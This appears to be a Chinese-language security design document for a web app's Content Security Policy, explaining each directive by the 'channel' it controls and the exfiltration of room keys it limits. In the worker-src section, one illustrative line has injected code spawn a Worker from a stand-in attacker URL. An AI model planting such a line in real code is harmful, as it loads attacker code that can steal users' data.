# Web CSP 設計：以「通道」為單位的收斂

- Status: Current（enforce 中）
- 決策記錄：[ADR-0004](../adr/0004-code-delivery-trust-boundary.md)（為什麼 CSP 是
  defense-in-depth 而非授權機制、各項邊界內妥協的原因）
- 營運文件：[web security headers](../operations/web-security-headers.md)（header 一覽、
  allowlist 觸發點表、rollout 程序）
- 政策單一來源：`apps/web/src/config/security-headers.ts`；測試釘住：
  `apps/web/tests/security-headers.test.ts`

本文回答「每條 directive 為什麼長這樣」。設計的出發點不是逐條抄安全建議，而是把瀏覽器
的能力拆成幾類**通道**，每類通道問同一個問題：被注入的程式碼（threat model T16 的
runtime injection 來源）能用它做什麼？然後收斂到正常功能所需的最小集合。

## 通道模型

| 通道 | Directive | 被注入程式碼能拿它做什麼 | 我們的收斂 |
| --- | --- | --- | --- |
| 執行外部程式碼 | `script-src` | 從外部 origin 載入任意 script，以頁面權限執行 | `'self' 'unsafe-inline'`；**零外部 origin** |
| 背景執行程式碼 | `worker-src` | `new Worker(url)` 把程式碼丟進背景執行緒執行 | `'self' blob:`（見下節） |
| 把資料送出去 | `connect-src` | `fetch`／XHR／WebSocket 外送任意資料（room key 的 exfiltration 通道） | 5 個有明確觸發點的 origin |
| 內嵌別人 | `frame-src` | 嵌入外部頁面（跨 origin iframe 摸不到父頁） | 精確等於 embed 決策清單 |
| 被別人內嵌 | `frame-ancestors` | —（防的是 clickjacking，不是注入） | `'none'`＋`X-Frame-Options: DENY` |
| 改寫解析基準 | `base-uri` | 注入 `<base>` 讓相對路徑 script 指向外部 | `'none'` |
| 外掛執行 | `object-src` | `<object>`／`<embed>` 舊式執行面 | `'none'` |
| 表單外送 | `form-action` | 注入表單把輸入送到外部 | `'self'` |
| 樣式 | `style-src` | 注入 CSS（低風險：無程式碼執行） | `'self' 'unsafe-inline'` |
| 圖片／字型 | `img-src`／`font-src` | 低風險載入面；仍收斂以縮小出口 | 各自的最小清單 |

核心觀念（CLAIM-CDB-3）：`connect-src` 是本設計的主控制——它決定 room key「送得出去嗎、
送得到哪」。`script-src`／`worker-src` 是次控制——它們決定「多容易把惡意程式碼弄進來」。
CSP 擋不住能改動 bundle 的 operator（T16 accepted limitation），它做的是讓注入後的
exfiltration 需要繞更多路。

## worker-src 為什麼是 `'self' blob:`

Web Worker 是「以頁面權限在背景執行 script」的通道，風險等級與 `script-src` 同類：
不設限時，被注入的程式碼可以 `new Worker("https://attacker.example/evil.js")` 直接拉外部
程式碼進來跑。

正常功能只有一個使用者：**Excalidraw 的字型 subset worker**。畫布輸入 CJK 文字或匯出時，
上游在背景 worker 裡把 12MB 級的 CJK 字型裁剪到實際用到的字元，避免主執行緒卡死與匯出
檔案爆量。該 worker 的 script 由 Next.js 打包在自家 origin（`/_next/static/...`），
`'self'` 即涵蓋。

- **`'self'`**：確定需要（subset worker 的實際來源）。
- **`blob:`**：允許 `URL.createObjectURL()` 產生的記憶體 blob URL 建 worker——常見的程式庫
  寫法（把 worker 程式碼組成字串→blob→worker）。它比 `'self'` 寬：被注入的程式碼可把任意
  字串變成 blob worker 執行，等於繞過「worker 必須來自自家檔案」。目前保留是**保守待驗證**
  ：enforce 下少放一個真正需要的來源會直接壞功能，而 blob worker 仍受頁面 CSP 的
  `connect-src` 約束（資料仍送不出允許清單之外），所以先寬後收。
- **收斂條件**：走查（含 CJK 輸入與 SVG/PNG 匯出）全程無 `worker-src`／blob 違規，即可
  把 `blob:` 移除並同步改測試斷言。這是目前政策中唯一標記「待實測收斂」的來源。

## script-src 為什麼容忍 'unsafe-inline'（而 worker-src 不需要）

靜態 CSP（build 時凍結，無 per-request nonce middleware）無法 hash App Router 逐 request
串流的 inline flight script，`NextSSRPlugin` 與 `next-themes` 也各注入無 nonce 的 inline
script——完整推導在 ADR-0004。取捨結果：`script-src` 放棄 inline 防護、堅守「零外部
origin」；`worker-src` 沒有對應的 inline 需求，因此不需要同等妥協。這也解釋了 embed 決策
（見 ADR-0004）：twitter/x、reddit、gist 的 embed 需要外部 script origin 才能動，直接在
validator 層拒絕，讓「零外部 script origin」保持無例外。

## 變更守則

1. 任何 directive 要新增來源，先回答：它屬於哪個通道？正常路徑（不是錯誤路徑）真的需要
   嗎？——判準見 ADR-0004 的字型自託管 trade-off 一節：能 self-host 就不 allowlist。
2. 改 `apps/web/src/config/security-headers.ts` 前，先更新測試與營運文件的觸發點表；
   政策、測試、文件三者由同一次 commit 對齊。
3. 走 report-only 重新走查再 enforce（程序見營運文件）。
